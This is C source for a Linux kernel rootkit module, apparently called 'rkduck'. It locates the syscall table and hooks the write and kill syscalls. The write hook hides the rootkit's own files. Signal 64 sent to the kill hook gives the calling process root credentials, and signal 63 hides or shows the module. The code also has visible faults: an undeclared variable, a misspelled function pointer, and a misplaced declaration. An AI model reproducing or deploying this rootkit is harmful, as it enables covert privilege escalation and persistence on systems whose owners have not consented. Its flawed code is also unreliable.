#include "syscalls.h"

ptr_t find_syscall_table(void) {
    ptr_t** sc_table;
    ptr_t addr = SCT_START_CHECK;
    
    while (addr < SCT_END_CHECK) {
        sc_table = (ptr_t**) addr;
        if (sc_table[__NR_close] == (ptr_t*) sys_close) {
            return (ptr_t) &sc_table[0];
        }

        addr += sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t duck_write(int fd, const char __user *buff, ssize_t count) {
	int r = 0;
	char *proc_protect = ".rkduck";
	char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
	
	if (!copy_from_user(kbuff, buff, 255)) {
		if (strstr(kbuff, proc_protect)) {
			kfree(kbuff);
			return EEXIST;
		}

		r = (*original_write)(fd, buff, count);
		kfree(kbuff);
	}
		
	return r;
}

asmlinkage ssize_t duck_kill(pid_t pid, int sig)
{
    switch (sig) {

		case 64:
        	struct cred *new_root_creds;
    		new_root_creds = prepare_creds();

    		if (new_root_creds == NULL) {
				r = (*orginal_kill)(pid, sig);
				return r;
			}

			#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
				&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
				|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)

				new_root_creds->uid.val = new_root_creds->gid.val = 0;
    			new_root_creds->euid.val = new_root_creds->egid.val = 0;
    			new_root_creds->suid.val = new_root_creds->sgid.val = 0;
    			new_root_creds->fsuid.val = new_root_creds->fsgid.val = 0;

			#else

				new_root_creds->uid = new_root_creds->gid = 0;
    			new_root_creds->euid = new_root_creds->egid = 0;
    			new_root_creds->suid = new_root_creds->sgid = 0;
    			new_root_creds->fsuid = new_root_creds->fsgid = 0;

			#endif

        	commit_creds(new_root_creds);
			return 0;
		
		case 63:
			if (mod_hidden == 0) {
				module_hide();
				return 0;
			}
			module_show();
			return 0;
			
    }


	r = (*original_kill)(pid, sig);
	return r;
}